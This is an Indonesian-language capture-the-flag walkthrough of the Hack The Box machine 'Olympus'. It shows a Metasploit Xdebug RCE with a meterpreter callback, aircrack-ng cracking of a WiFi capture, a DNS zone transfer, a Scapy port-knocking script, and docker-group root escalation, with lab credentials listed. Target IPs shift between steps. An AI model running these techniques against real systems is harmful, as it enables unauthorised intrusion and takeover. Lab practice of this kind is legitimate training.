## **Informasi Mesin**
- **Nama**: Olympus
- **OS**: Linux
- **Difficulty**: Medium
- **IP**: 10.129.24.152
## **1. Reconnaissance**

### **1.1 Port Scanning**

Menggunakan Rustscan untuk memindai port:

```bash
rustscan -a $ip --ulimit 1000 -r 1-65535 -- -A -sC -Pn

53/tcp   open  domain  (DNS - Banner menunjukkan Bind)
80/tcp   open  http    (Apache)
2222/tcp open  ssh     (SSH)

- Port 53: DNS service (BIND)
    
- Port 80: Web server Apache
    
- Port 2222: SSH
    
```
### **1.2 Enumeration Web (Port 80)**

Website berjalan di Apache dengan judul "Crete island - Olympus HTB".  
Header response menunjukkan informasi penting:


```http

Xdebug: 2.5.5
```

**Xdebug 2.5.5** dikenal memiliki kerentanan RCE (Remote Code Execution) melalui debugging tool PHP yang tidak terautentikasi.

---

## **2. Initial Access**

### **2.1 Eksploitasi Xdebug**

Menggunakan Metasploit untuk memanfaatkan kerentanan:

```bash
msfconsole
search xdebug
use exploit/unix/http/xdebug_unauth_exec
set RHOSTS 10.129.23.76
set LHOST 10.10.14.90
run
```

Payload berhasil dieksekusi, mendapatkan **meterpreter session**.

### **2.2 Post-Exploitation di Container**

Dari meterpreter:
```bash
hostname
# f00ba96171c5 → menunjukkan bahwa kita berada di dalam container

ifconfig
# eth0: 172.20.0.2 → jaringan internal container

arp -a
# Gateway: 172.20.0.1
```

Ditemukan file capture WiFi di `/home/zeus/airgeddon/captured/captured.cap`.

### **2.3 Crack Password WiFi**

Transfer file `.cap` ke mesin lokal, lalu:

```bash
aircrack-ng -e Too_cl0se_to_th3_Sun -w /usr/share/wordlists/rockyou.txt captured.cap
```

**Password ditemukan:** `flightoficarus`

### **2.4 SSH Access**

Coba login dengan kombinasi:

```bash
ssh icarus@10.129.24.152 -p 2222
```

Password yang berhasil: `Too_cl0se_to_th3_Sun`  
(berbeda dengan password WiFi, kemungkinan adalah username:password yang digunakan untuk SSH).

**Credentials valid:**

- **Username:** icarus
    
- **Password:** Too_cl0se_to_th3_Sun
    

---

## **3. Privilege Escalation (Container → Host)**

### **3.1 Enumeration di Container**

Di dalam home directory `icarus` ditemukan:
```bash
cat help_of_the_gods.txt
# Athena goddess will guide you through the dark...
# Way to Rhodes...
# ctfolympus.htb
```
File tersebut mengindikasikan bahwa kita masih di dalam container dan perlu mencari jalan ke host.

### **3.2 DNS Zone Transfer**

Coba lakukan DNS zone transfer:

```bash
dig axfr @10.129.17.54 ctfolympus.htb
```

```text
ctfolympus.htb. IN TXT "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
```

Ini adalah **petunjuk port knocking** dengan urutan port `3456`, `8234`, `62431`, dan password `St34l_th3_F1re!`.

### **3.3 Port Knocking & SSH ke Prometheus**

Buat script Python untuk knocking:

```python
#!/usr/bin/env python
from scapy.all import *
import pyperclip

def SendSyn(ip, port):
    ip=IP(src="10.10.14.42", dst=ip)
    SYN=TCP(sport=7777, dport=port, flags="S", seq=12345)
    send(ip/SYN)

ports = [3456, 8234, 62431]
for port in ports:
    SendSyn("10.129.17.54", port)

print("[+] Portal should be open.\nRun:\nssh prometheus@10.129.17.54\npassword: St34l_th3_F1re!")
pyperclip.copy('St34l_th3_F1re!\n')
```

Jalankan script, lalu:


```bash
ssh prometheus@10.129.24.152
```
# Password: St34l_th3_F1re!

Berhasil login sebagai `prometheus`.

### **3.4 User Flag**

bash

cat user.txt
# 3a2f**************

---

## **4. Privilege Escalation (Prometheus → Root)**

### **4.1 Enumeration User Prometheus**

```bash
groups
# prometheus cdrom floppy audio dip video plugdev netdev bluetooth docker
```

User `prometheus` adalah anggota grup **docker** → dapat dieksploitasi untuk root access.

### **4.2 Docker Privilege Escalation**

Cek image yang tersedia:


```bash
docker ps
```

Gunakan docker untuk mount root filesystem host:

```bash
docker run -v /:/hostOS -it rodhes bash
```

Kita sekarang berada di dalam container dengan akses root, dan root filesystem host ter-mount di `/hostOS`.

### **4.3 Root Flag**

bash

cd /hostOS/root
cat root.txt
# 2c7f**************

---

## **5. Summary**

**Langkah-langkah:**

1. **Recon** → Port 80 dengan Xdebug 2.5.5
    
2. **Exploit** → RCE via Xdebug → Meterpreter session
    
3. **Post-Exploit** → Crack WiFi password → SSH credentials
    
4. **Container Escape** → Port knocking → SSH sebagai prometheus
    
5. **Privilege Escalation** → Docker group → Mount root filesystem → Root access
    

**Flags:**

- **User flag:** `3a2f**************`
    
- **Root flag:** `2c7f**************`